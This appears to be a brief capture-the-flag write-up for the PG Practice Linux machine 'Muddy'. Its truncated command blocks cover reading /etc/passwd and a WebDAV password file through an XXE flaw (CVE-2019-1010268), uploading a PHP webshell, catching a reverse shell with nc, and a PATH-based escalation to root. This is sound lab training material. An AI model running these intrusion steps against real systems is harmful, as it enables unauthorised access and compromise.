###### tags: `Offsec` `PG Practice` `Easy` `Linux` # Muddy
```
┌──(kali㉿kali)-[~/pgplay]
...
``` google[CVE-2019-1010268](https://vk9-sec.com/xxe-ladon-framework-for-python-xml-external-entity-expansion-cve-2019-1010268/)can get`/etc/passwd`,
```
┌──(kali㉿kali)-[~/pgplay]
└─$ curl -s -X $'POST' \
...
``` use`/var/www/html/webdav/passwd.dav`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ curl -s -X $'POST' \
> -H $'Content-Type: text/xml;charset=UTF-8' \
...
sleepless        (?) 
``` [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)can log in`webdav`server,can uploadshell.php
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Open nc,Go to `http://muddy.ugc/webdav/shell.php`,wait for reverse shell,`/var/www`pathget local.txt
```
┌──(kali㉿kali)-[~/pgplay]
...
``` find`PATH``/dev/shm`,`/dev/shm`netstat,
```
┌──(kali㉿kali)-[~/pgplay]
...
``` wait for reverse shell/rootget proof.txt
```
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
